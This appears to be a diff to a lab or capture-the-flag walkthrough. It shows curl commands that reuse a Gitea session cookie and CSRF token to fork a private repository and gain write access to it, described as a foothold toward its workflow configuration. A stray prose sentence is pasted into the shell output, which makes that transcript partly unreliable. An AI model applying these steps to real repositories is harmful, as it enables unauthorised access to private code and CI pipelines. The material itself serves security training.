@@ -2670,10 +2670,21 @@ curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
 
 **Result:**
 
-```
+```shell
+josh@SRV01:~$ CSRF=$(grep _csrf /tmp/gitea_cookies.txt | awk '{print $7}')
+
+curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
+  -X POST -H "Content-Type: application/json" \
+  -H "X-Csrf-Token: $CSRF" \
+  -d '{}' \
+  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/forks" \
+  | python3 -c "import sys,json; d=json.load(sys.stdin); print('full_name:', d.get('full_name')); print('perms:', d.get('permissions')); print('message:', d.get('message',''))"
+
+A fork lands in your own namespace with full write access — which is the foothold for
 full_name: darkzero-ext_josh/DarkZero-Campaigns
 perms: {'admin': True, 'push': True, 'pull': True}
-message:
+message: 
+A: command not found
 ```
 
 **What this gives you:** A fully writable copy of the private repository, including its workflow configuration.
